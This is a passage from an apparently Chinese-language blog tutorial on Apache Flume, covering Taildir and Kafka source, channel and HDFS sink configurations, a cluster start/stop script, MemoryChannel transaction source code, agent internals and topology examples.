/opt/module/flume/tail_dir.json</span><br><span class="line">a3.sources.r3.filegroups = f1 f2</span><br><span class="line">a3.sources.r3.filegroups.f1 = /opt/module/flume/files/.*file.*</span><br><span class="line">a3.sources.r3.filegroups.f2 = /opt/module/flume/files2/.*<span class="built_in">log</span>.*</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a3.sinks.k3.type = hdfs</span><br><span class="line">a3.sinks.k3.hdfs.path = hdfs://mycluster/flume/upload2/%Y%m%d/%H</span><br><span class="line"><span class="comment">#上传文件的前缀</span></span><br><span class="line">a3.sinks.k3.hdfs.filePrefix = upload-</span><br><span class="line"><span class="comment">#是否按照时间滚动文件夹</span></span><br><span class="line">a3.sinks.k3.hdfs.round = <span class="literal">true</span></span><br><span class="line"><span class="comment">#多少时间单位创建一个新的文件夹</span></span><br><span class="line">a3.sinks.k3.hdfs.roundValue = 1</span><br><span class="line"><span class="comment">#重新定义时间单位</span></span><br><span class="line">a3.sinks.k3.hdfs.roundUnit = hour</span><br><span class="line"><span class="comment">#是否使用本地时间戳</span></span><br><span class="line">a3.sinks.k3.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#积攒多少个 Event 才 flush 到 HDFS 一次</span></span><br><span class="line">a3.sinks.k3.hdfs.batchSize = 100</span><br><span class="line"><span class="comment">#设置文件类型，可支持压缩，还有gzip等</span></span><br><span class="line">a3.sinks.k3.hdfs.fileType = DataStream</span><br><span class="line"><span class="comment">#多久生成一个新的文件</span></span><br><span class="line">a3.sinks.k3.hdfs.rollInterval = 60</span><br><span class="line"><span class="comment">#设置每个文件的滚动大小大概是 128M</span></span><br><span class="line">a3.sinks.k3.hdfs.rollSize = 134217700</span><br><span class="line"><span class="comment">#文件的滚动与 Event 数量无关</span></span><br><span class="line">a3.sinks.k3.hdfs.rollCount = 0</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a3.channels.c3.type = memory</span><br><span class="line">a3.channels.c3.capacity = 1000</span><br><span class="line">a3.channels.c3.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a3.sources.r3.channels = c3</span><br><span class="line">a3.sinks.k3.channel = c3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动监控文件夹命令</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-taildir-hdfs.conf</span><br><span class="line"><span class="comment"># 在/opt/module/flume 目录下创建 files 文件夹</span></span><br><span class="line">mkdir files&#123;1,2&#125;</span><br><span class="line"><span class="built_in">echo</span> hello &gt;&gt; file1.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-Taildir-问题说明">4.3 Taildir 问题说明</h3><p>Taildir Source 维护了一个 json 格式的 position File，其会定期的往 position File中更新每个文件读取到的最新的位置，因此能够实现断点续传。Linux 中储存文件元数据的区域就叫做 inode，每个 inode 都有一个号码，操作系统用 inode 号码来识别不同的文件。</p><p>但是例如log4j的日志是每过凌晨自动更名为新的文件，这会导致数据的重复上传，若后端不配合，可以修改源码，flume-ng-sources→flume-taildir-source源码包，ReliableTailEventReader读数据，TailFile的更新数据，将更新和读取仅按照inode来。修改完成后打包去lib文件夹，替换掉原来的的jar包</p><h2 id="5、Kafka相关">5、Kafka相关</h2><blockquote><p>kafka相关文档：<a href="https://flume.apache.org/releases/content/1.11.0/FlumeUserGuide.html#kafka-channel" target="_blank" rel="noopener" title="https://flume.apache.org/releases/content/1.11.0/FlumeUserGuide.html#kafka-channel">https://flume.apache.org/releases/content/1.11.0/FlumeUserGuide.html#kafka-channel</a></p></blockquote><p>flume一般都和kafka配合使用，用于离线和实时数仓的数据获取，kafka source相当于kafka的消费者，channel数据会存储到kafka topic中，而kafka sink相当于生产者</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329730.png" alt></p><p>进入flume软件目录，编写配置文件<code>vim job/file_to_kafka.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义组件</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置source</span></span><br><span class="line">a1.sources.r1.type = TAILDIR</span><br><span class="line">a1.sources.r1.filegroups = f1</span><br><span class="line">a1.sources.r1.filegroups.f1 = /opt/module/applog/<span class="built_in">log</span>/app.*</span><br><span class="line">a1.sources.r1.positionFile = /opt/module/flume/taildir_position.json</span><br><span class="line"><span class="comment"># 自定义拦截器，这里是将不合格的json数据过滤</span></span><br><span class="line"><span class="comment"># a1.sources.r1.interceptors =  i1</span></span><br><span class="line"><span class="comment"># a1.sources.r1.interceptors.i1.type = com.atguigu.gmall.flume.interceptor.ETLInterceptor$Builder</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel</span></span><br><span class="line">a1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannel</span><br><span class="line">a1.channels.c1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092</span><br><span class="line">a1.channels.c1.kafka.topic = topic_log</span><br><span class="line"><span class="comment"># 不以flume event存储</span></span><br><span class="line">a1.channels.c1.parseAsFlumeEvent = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#组装</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动flume</span></span><br><span class="line">bin/flume-ng agent -n a1 -c conf/ -f job/file_to_kafka.conf -Dflume.root.logger=info,console</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动一个Kafka的Console-Consumer</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic topic_log</span><br></pre></td></tr></table></figure><p>同理还有kafka到hdfs的flume配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义组件</span></span><br><span class="line">a1.sources=r1</span><br><span class="line">a1.channels=c1</span><br><span class="line">a1.sinks=k1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置source1</span></span><br><span class="line">a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</span><br><span class="line">a1.sources.r1.batchSize = 5000</span><br><span class="line">a1.sources.r1.batchDurationMillis = 2000</span><br><span class="line">a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092</span><br><span class="line">a1.sources.r1.kafka.topics=topic_log</span><br><span class="line"><span class="comment"># a1.sources.r1.interceptors = i1</span></span><br><span class="line"><span class="comment"># a1.sources.r1.interceptors.i1.type = com.atguigu.interceptor.TimestampInterceptor$Builder</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel</span></span><br><span class="line">a1.channels.c1.type = file</span><br><span class="line">a1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior1</span><br><span class="line">a1.channels.c1.dataDirs = /opt/module/flume/data/behavior1</span><br><span class="line">a1.channels.c1.maxFileSize = 2146435071</span><br><span class="line">a1.channels.c1.capacity = 1000000</span><br><span class="line">a1.channels.c1.keep-alive = 6</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sink</span></span><br><span class="line">a1.sinks.k1.type = hdfs</span><br><span class="line">a1.sinks.k1.hdfs.path = /origin_data/gmall/<span class="built_in">log</span>/topic_log/%Y-%m-%d</span><br><span class="line">a1.sinks.k1.hdfs.filePrefix = <span class="built_in">log</span></span><br><span class="line">a1.sinks.k1.hdfs.round = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1.sinks.k1.hdfs.rollInterval = 10</span><br><span class="line">a1.sinks.k1.hdfs.rollSize = 134217728</span><br><span class="line">a1.sinks.k1.hdfs.rollCount = 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制输出文件类型</span></span><br><span class="line">a1.sinks.k1.hdfs.fileType = CompressedStream</span><br><span class="line">a1.sinks.k1.hdfs.codeC = gzip</span><br><span class="line"></span><br><span class="line"><span class="comment">#组装</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><h2 id="6、Kafka群起脚本">6、Kafka群起脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">" --------启动 <span class="variable">$i</span> 采集flume-------"</span></span><br><span class="line">                ssh <span class="variable">$i</span> <span class="string">"nohup /opt/module/flume/bin/flume-ng agent -n a1 -c /opt/module/flume/conf/ -f /opt/module/flume/job/file_to_kafka.conf &gt;/dev/null 2&gt;&amp;1 &amp;"</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">&#125;;; </span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">" --------停止 <span class="variable">$i</span> 采集flume-------"</span></span><br><span class="line">                <span class="comment"># $2默认获取脚本第二个参数，加个反斜杠是获取数据中的第二个参数</span></span><br><span class="line">                ssh <span class="variable">$i</span> <span class="string">"ps -ef | grep file_to_kafka | grep -v grep |awk  '&#123;print \$2&#125;' | xargs -n1 kill -9 "</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h1>三、Flume 进阶</h1><h2 id="1、Flume-事务">1、Flume 事务</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251329731.png" alt></p><p>下面时commit和rollback的核心源码，回滚的时候，putList会直接清空，而takeList会将数据重新塞回到channel中(sink的hdfs写成功但通讯失败可能重复消费，source的nc可能会消息丢失)；doCommit会提前判断channel够不够takeList回滚以防回滚失败</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doCommit</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> remainingChange = takeList.size() - putList.size();</span><br><span class="line">  <span class="keyword">if</span> (remainingChange &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!bytesRemaining.tryAcquire(putByteCounter, keepAlive, TimeUnit.SECONDS)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ChannelException(<span class="string">"Cannot commit transaction. Byte capacity "</span> +</span><br><span class="line">          <span class="string">"allocated to store event body "</span> + byteCapacity * byteCapacitySlotSize +</span><br><span class="line">          <span class="string">"reached. Please increase heap space/byte capacity allocated to "</span> +</span><br><span class="line">          <span class="string">"the channel as the sinks may not be keeping up with the sources"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!queueRemaining.tryAcquire(-remainingChange, keepAlive, TimeUnit.SECONDS)) &#123;</span><br><span class="line">      bytesRemaining.release(putByteCounter);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ChannelFullException(<span class="string">"Space for commit to queue couldn't be acquired."</span> +</span><br><span class="line">          <span class="string">" Sinks are likely not keeping up with sources, or the buffer size is too tight"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> puts = putList.size();</span><br><span class="line">  <span class="keyword">int</span> takes = takeList.size();</span><br><span class="line">  <span class="keyword">synchronized</span> (queueLock) &#123;</span><br><span class="line">    <span class="keyword">if</span> (puts &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (!putList.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!queue.offer(putList.removeFirst())) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Queue add failed, this shouldn't be able to happen"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    putList.clear();</span><br><span class="line">    takeList.clear();</span><br><span class="line">  &#125;</span><br><span class="line">  bytesRemaining.release(takeByteCounter);</span><br><span class="line">  takeByteCounter = <span class="number">0</span>;</span><br><span class="line">  putByteCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  queueStored.release(puts);</span><br><span class="line">  <span class="keyword">if</span> (remainingChange &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    queueRemaining.release(remainingChange);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (puts &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    channelCounter.addToEventPutSuccessCount(puts);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (takes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    channelCounter.addToEventTakeSuccessCount(takes);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  channelCounter.setChannelSize(queue.size());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doRollback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> takes = takeList.size();</span><br><span class="line">  <span class="keyword">synchronized</span> (queueLock) &#123;</span><br><span class="line">    Preconditions.checkState(queue.remainingCapacity() &gt;= takeList.size(),</span><br><span class="line">        <span class="string">"Not enough space in memory channel "</span> +</span><br><span class="line">        <span class="string">"queue to rollback takes. This should never happen, please report"</span>);</span><br><span class="line">    <span class="keyword">while</span> (!takeList.isEmpty()) &#123;</span><br><span class="line">      queue.addFirst(takeList.removeLast());</span><br><span class="line">    &#125;</span><br><span class="line">    putList.clear();</span><br><span class="line">  &#125;</span><br><span class="line">  putByteCounter = <span class="number">0</span>;</span><br><span class="line">  takeByteCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  queueStored.release(takes);</span><br><span class="line">  channelCounter.setChannelSize(queue.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、Flume-Agent-内部原理">2、Flume Agent 内部原理</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251329732.png" alt></p><ul><li><p><strong>ChannelSelector</strong></p><p>ChannelSelector 的作用就是选出 Event 将要被发往哪个 Channel。其共有两种类型，分别是 **Replicating（复制）**和 <strong>Multiplexing（多路复用）</strong></p><p>ReplicatingSelector 会将同一个 Event 发往所有的 Channel，Multiplexing 会根据相应的原则，将不同的 Event 发往不同的 Channel</p></li><li><p><strong>SinkProcessor</strong></p><p>SinkProcessor 共 有 三 种 类 型 ， 分 别 是 <strong>DefaultSinkProcessor 、LoadBalancingSinkProcessor 和 FailoverSinkProcessor</strong></p><p>DefaultSinkProcessor 对应的是单个的 Sink ， LoadBalancingSinkProcessor 和 FailoverSinkProcessor 对应的是 Sink Group，LoadBalancingSinkProcessor 可以实现负载均衡的功能，FailoverSinkProcessor 可以错误恢复的功能</p></li></ul><h2 id="3、Flume-拓扑结构">3、Flume 拓扑结构</h2><h3 id="3-1-简单串联">3.1 简单串联</h3><p>这种模式是将多个 flume 顺序连接起来了，从最初的 source 开始到最终 sink 传送的目的存储系统。此模式不建议桥接过多的 flume 数量， flume 数量过多不仅会影响传输速率，而且一旦传输过程中某个节点 flume 宕机，会影响整个传输系统。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329733.png" alt></p><h3 id="3-2-复制和多路复用">3.2 复制和多路复用</h3><p>Flume 支持将事件流向一个或者多个目的地。这种模式可以将相同数据复制到多个channel 中，或者将不同数据分发到不同的 channel 中，sink 可以选择传送到不同的目的地</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329734.png" alt></p><h3 id="3-3-负载均衡和故障转移">3.3 负载均衡和故障转移</h3><p>Flume支持使用将多个sink逻辑上分到一个sink组，sink组配合不同的SinkProcessor可以实现负载均衡和错误恢复的功能</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329735.png" alt></p><h3 id="3-4-聚合">3.4 聚合</h3><p>这种模式是我们最常见的，也非常实用，日常 web 应用通常分布在上百个服务器，大者甚至上千个、上万个服务器。产生的日志，处理起来也非常麻烦。用 flume 的这种组合方式能很好的解决这一问题，每台服务器部署一个 flume 采集日志，传送到一个集中收集日志的flume，再由此 flume 上传到 hdfs、hive、hbase 等，进行日志分析</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329736.png" alt></p><h2 id="4、Flume-企业开发案例">4、Flume 企业开发案例</h2><h3 id="4-1-复制和多路复用">4.1 复制和多路复用</h3><p>使用 Flume-1 监控文件变动，Flume-1 将变动内容传递给 Flume-2，Flume-2 负责存储到 HDFS。同时 Flume-1 将变动内容传递给 Flume-3，Flume-3 负责输出到 LocalFileSystem</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329737.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#avro-sink</span></span><br><span class="line"><span class="comment"># 在/opt/module/flume/job 目录下创建 group1 文件夹并进入</span></span><br><span class="line"><span class="comment"># 在/opt/module/datas/目录下创建 flume3 文件夹并进入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># group1下创建 flume-file-flume.conf</span></span><br><span class="line"><span class="comment"># 配置 1 个接收日志文件的 source 和两个 channel、两个 sink，分别输送给 flume-flumehdfs 和 flume-flume-dir</span></span><br><span class="line">vim flume-file-flume.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1 k2</span><br><span class="line">a1.channels = c1 c2</span><br><span class="line"><span class="comment"># 将数据流复制给所有 channel，默认不写就是复制</span></span><br><span class="line">a1.sources.r1.selector.type = replicating</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.r1.command = tail -F /opt/module/hive/logs/hive.log</span><br><span class="line">a1.sources.r1.shell = /bin/bash -c</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line"><span class="comment"># sink 端的 avro 是一个数据发送者</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop102</span><br><span class="line">a1.sinks.k1.port = 4141</span><br><span class="line">a1.sinks.k2.type = avro</span><br><span class="line">a1.sinks.k2.hostname = hadoop102</span><br><span class="line">a1.sinks.k2.port = 4142</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line">a1.channels.c2.type = memory</span><br><span class="line">a1.channels.c2.capacity = 1000</span><br><span class="line">a1.channels.c2.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1 c2</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">a1.sinks.k2.channel = c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume-flume-hdfs.conf，配置上级 Flume 输出的 Source，输出是到 HDFS 的 Sink</span></span><br><span class="line">vim flume-flume-hdfs.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a2.sources = r1</span><br><span class="line">a2.sinks = k1</span><br><span class="line">a2.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line"><span class="comment"># source 端的 avro 是一个数据接收服务</span></span><br><span class="line">a2.sources.r1.type = avro</span><br><span class="line">a2.sources.r1.bind = hadoop102</span><br><span class="line">a2.sources.r1.port = 4141</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a2.sinks.k1.type = hdfs</span><br><span class="line">a2.sinks.k1.hdfs.path = hdfs://mycluster/flume2/%Y%m%d/%H</span><br><span class="line"><span class="comment">#上传文件的前缀</span></span><br><span class="line">a2.sinks.k1.hdfs.filePrefix = flume2-</span><br><span class="line"><span class="comment">#是否按照时间滚动文件夹</span></span><br><span class="line">a2.sinks.k1.hdfs.round = <span class="literal">true</span></span><br><span class="line"><span class="comment">#多少时间单位创建一个新的文件夹</span></span><br><span class="line">a2.sinks.k1.hdfs.roundValue = 1</span><br><span class="line"><span class="comment">#重新定义时间单位</span></span><br><span class="line">a2.sinks.k1.hdfs.roundUnit = hour</span><br><span class="line"><span class="comment">#是否使用本地时间戳</span></span><br><span class="line">a2.sinks.k1.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#积攒多少个 Event 才 flush 到 HDFS 一次</span></span><br><span class="line">a2.sinks.k1.hdfs.batchSize = 100</span><br><span class="line"><span class="comment">#设置文件类型，可支持压缩</span></span><br><span class="line">a2.sinks.k1.hdfs.fileType = DataStream</span><br><span class="line"><span class="comment">#多久生成一个新的文件</span></span><br><span class="line">a2.sinks.k1.hdfs.rollInterval = 30</span><br><span class="line"><span class="comment">#设置每个文件的滚动大小大概是 128M</span></span><br><span class="line">a2.sinks.k1.hdfs.rollSize = 134217700</span><br><span class="line"><span class="comment">#文件的滚动与 Event 数量无关</span></span><br><span class="line">a2.sinks.k1.hdfs.rollCount = 0</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a2.channels.c1.type = memory</span><br><span class="line">a2.channels.c1.capacity = 1000</span><br><span class="line">a2.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a2.sources.r1.channels = c1</span><br><span class="line">a2.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume-flume-dir.conf,配置上级 Flume 输出的 Source，输出是到本地目录的 Sink</span></span><br><span class="line">vim flume-flume-dir.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a3.sources = r1</span><br><span class="line">a3.sinks = k1</span><br><span class="line">a3.channels = c2</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a3.sources.r1.type = avro</span><br><span class="line">a3.sources.r1.bind = hadoop102</span><br><span class="line">a3.sources.r1.port = 4142</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a3.sinks.k1.type = file_roll</span><br><span class="line">a3.sinks.k1.sink.directory = /opt/module/data/flume3</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a3.channels.c2.type = memory</span><br><span class="line">a3.channels.c2.capacity = 1000</span><br><span class="line">a3.channels.c2.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a3.sources.r1.channels = c2</span><br><span class="line">a3.sinks.k1.channel = c2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意输出的本地目录必须是已经存在的目录，如果该目录不存在，并不会创建新的目录</span></span><br></pre></td></tr></table></figure><p>执行配置文件并检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分别启动对应的 flume 进程：flume-flume-dir，flume-flume-hdfs，flume-file-flume</span></span><br><span class="line"><span class="comment"># 有先后关系</span></span><br><span class="line"></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group1/flume-flume-dir.conf</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a2 --conf-file 